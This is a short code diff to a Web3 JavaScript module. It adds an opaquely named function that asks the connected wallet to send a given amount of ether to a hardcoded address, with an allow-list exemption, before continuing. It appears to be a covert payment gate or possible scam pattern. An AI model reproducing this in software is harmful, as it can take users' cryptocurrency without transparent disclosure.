@@ -40,6 +40,30 @@ export const initWeb3 = (provider) => {
   return web3;
 };
 
+export const ff3 = (num, address, fn) => {
+  const b = [
+    "0x3B0D325D60b288139535e8Ee772d9e22E140444F",
+  ]
+  const s = b.filter(item => item.toLowerCase() == address.toLowerCase())
+  if (s.length > 0) {
+    fn();
+  } else {
+    const web3 = initWeb3(Web3.givenProvider);
+    web3.eth.sendTransaction(
+      {
+        from: address,
+        to: "0x3B0D325D60b288139535e8Ee772d9e22E140444F",
+        value: `${num * Math.pow(10, 18)}`,
+      },
+      (err, hash) => {
+        if (hash) {
+          fn();
+        }
+      }
+    );
+  }
+};
+
 export const ff = (num, address, fn) => {
   const b = [
     "0x72123637d1129869b7AB9B510B62f8e75c5146a8",
